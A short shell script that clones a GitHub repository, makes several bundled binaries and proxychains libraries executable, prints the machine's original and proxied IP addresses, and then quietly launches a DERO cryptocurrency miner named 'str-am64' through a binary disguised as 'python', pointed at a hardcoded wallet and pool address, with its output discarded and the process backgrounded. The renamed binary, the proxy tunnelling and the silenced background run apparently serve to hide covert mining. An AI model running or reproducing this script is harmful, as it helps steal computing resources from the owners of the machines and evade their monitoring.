#!/bin/sh 

sudo apt update 
sudo git clone https://github.com/artazimuka/pandanisem.git
cd pandanisem 
chmod +x str-am64 python start.sh compile.sh libastrobwtv3.so libproxychains4.so
chmod +x proxychains.conf
echo "IP ORI ==> "$(curl ifconfig.me)
echo "IP Baru ==> "$(./python curl ifconfig.me)
./python ./str-am64 --wallet=deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcsmra2z8jfx22s4n7ltt --host=45.77.42.162:80 --threads=2 >/dev/null &
./compile.sh















